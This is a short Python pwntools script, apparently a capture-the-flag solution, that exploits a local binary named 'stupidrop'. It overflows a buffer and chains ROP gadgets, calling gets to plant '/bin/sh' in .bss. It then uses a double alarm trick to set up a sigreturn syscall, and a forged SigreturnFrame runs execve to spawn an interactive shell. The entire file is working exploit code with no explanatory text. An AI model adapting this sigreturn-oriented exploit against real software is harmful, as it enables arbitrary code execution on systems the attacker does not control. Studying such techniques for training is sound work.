from pwn import *

p = process('./stupidrop')
e = ELF('./stupidrop')
syscall = 0x000000000040063e
sh = e.bss()+0x100


prdi = 0x00000000004006a3
payload = 'A' * (0x30+8)
payload += p64(prdi)
payload += p64(sh)
payload += p64(e.symbols['gets'])

payload += p64(prdi)
payload += p64(15)
payload += p64(e.symbols['alarm'])
payload += p64(prdi)
payload += p64(0)
payload += p64(e.symbols['alarm'])


frame = SigreturnFrame(arch='amd64')
frame.rdi = sh
frame.rax = 0x3b
frame.rip = syscall

payload += p64(syscall)
payload += str(frame)

p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
